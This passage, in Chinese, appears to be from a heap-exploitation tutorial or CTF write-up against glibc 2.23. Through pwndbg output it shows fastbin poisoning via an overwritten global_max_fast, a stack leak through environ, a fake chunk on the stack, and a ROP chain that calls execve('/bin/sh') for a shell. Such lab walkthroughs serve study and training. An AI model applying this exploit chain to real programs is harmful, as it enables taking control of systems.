
```bash
pwndbg> x/1gx &global_max_fast 
0x7db0f978f7d8 <global_max_fast>:       0x00007db0f978db78
pwndbg> p/x chunks[1]
$1 = {
  size = 0x4930,
  addr = 0x589ea29c5520
}
pwndbg> x/4gx 0x589ea29c5520-0x10
0x589ea29c5510: 0x0000000000000510      0x0000000000004941
0x589ea29c5520: 0x0000000000000000      0x0000000000000000
pwndbg>
```

释放chunks[1]内存，将environ地址写入chunks[1]->fd。

```bash
pwndbg> x/4gx 0x589ea29c5520-0x10
0x589ea29c5510: 0x0000000000000510      0x0000000000004941
0x589ea29c5520: 0x00007ffde64b2ce8      0x0000000000000000
pwndbg> x/1gx &__environ
0x7db0f9a23100 <environ>:       0x00007ffde64b2ce8
pwndbg> stack -f
00:0000│ rsp 0x7ffde64b2ba8 —▸ 0x589e9aa1688a (main+266) ◂— jmp main+309
01:0008│-040 0x7ffde64b2bb0 ◂— 1
02:0010│-038 0x7ffde64b2bb8 ◂— 6
03:0018│-030 0x7ffde64b2bc0 ◂— 0x4941 /* 'AI' */
04:0020│-028 0x7ffde64b2bc8 —▸ 0x7db0f94332c0 (__internal_atexit+21) ◂— test rax, rax
05:0028│-020 0x7ffde64b2bd0 ◂— 0
06:0030│-018 0x7ffde64b2bd8 ◂— 0
07:0038│-010 0x7ffde64b2be0 —▸ 0x589e9aa161c0 (_start) ◂— endbr64
08:0040│-008 0x7ffde64b2be8 ◂— 0xdcd6c93f0d59c900
09:0048│ rbp 0x7ffde64b2bf0 ◂— 0
0a:0050│+008 0x7ffde64b2bf8 —▸ 0x7db0f941fc39 (__libc_start_main+385) ◂— jmp __libc_start_main+464
pwndbg> p/x 0x00007ffde64b2ce8-0x7ffde64b2bb8
$2 = 0x130
pwndbg> 
```

获取了stack上的地址之后，在stack伪造fake chunk。修改fast bin的fd为fake chunk。

```bash
pwndbg> x/4gx 0x589ea29c5520-0x10
0x589ea29c5510: 0x0000000000000510      0x0000000000004941
0x589ea29c5520: 0x00007ffde64b2bb8      0x0000000000000000
pwndbg> 
```

此时，连续申请chunks[1]和chunks[3]，其中chunks[3]便获得了stack的完全控制权。

```bash
pwndbg> p/x chunks[3]
$3 = {
  size = 0x4930,
  addr = 0x7ffde64b2bc8
}
pwndbg> telescope 0x7ffde64b2bc8
00:0000│-028 0x7ffde64b2bc8 —▸ 0x7db0f94332c0 (__internal_atexit+21) ◂— test rax, rax
01:0008│-020 0x7ffde64b2bd0 ◂— 0
02:0010│-018 0x7ffde64b2bd8 ◂— 0
03:0018│-010 0x7ffde64b2be0 —▸ 0x589e9aa161c0 (_start) ◂— endbr64
04:0020│-008 0x7ffde64b2be8 ◂— 0xdcd6c93f0d59c900
05:0028│ rbp 0x7ffde64b2bf0 ◂— 0
06:0030│+008 0x7ffde64b2bf8 —▸ 0x7db0f941fc39 (__libc_start_main+385) ◂— jmp __libc_start_main+464
07:0038│+010 0x7ffde64b2c00 —▸ 0x7db0f97897d8 —▸ 0x7db0f94964f6 (init_cacheinfo) ◂— push r13
pwndbg> 
```

使用rop技术在stack上布局gadgets片段。

```bash
pwndbg> telescope 0x7ffde64b2bc8 13
00:0000│ rsi 0x7ffde64b2bc8 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
... ↓        3 skipped
04:0020│+048 0x7ffde64b2be8 ◂— 0xdcd6c93f0d59c900
05:0028│+050 0x7ffde64b2bf0 ◂— 0
06:0030│+058 0x7ffde64b2bf8 —▸ 0x7db0f94202f1 (iconv+358) ◂— pop rdi
07:0038│+060 0x7ffde64b2c00 —▸ 0x7db0f9556d73 ◂— 0x68732f6e69622f /* '/bin/sh' */
08:0040│+068 0x7ffde64b2c08 —▸ 0x7db0f941fee3 (__gcc_personality_v0+81) ◂— pop rsi
09:0048│+070 0x7ffde64b2c10 ◂— 0
0a:0050│+078 0x7ffde64b2c18 —▸ 0x7db0f9401b92 ◂— pop rdx
0b:0058│+080 0x7ffde64b2c20 ◂— 0
0c:0060│+088 0x7ffde64b2c28 —▸ 0x7db0f94b3670 (execve) ◂— mov eax, 0x3b
pwndbg> 
```

退出程序，即可获取shell控制权。

### 未完待续...

## 参考

https://github.com/BinRacer/pwn4heap/tree/master/src/2.23
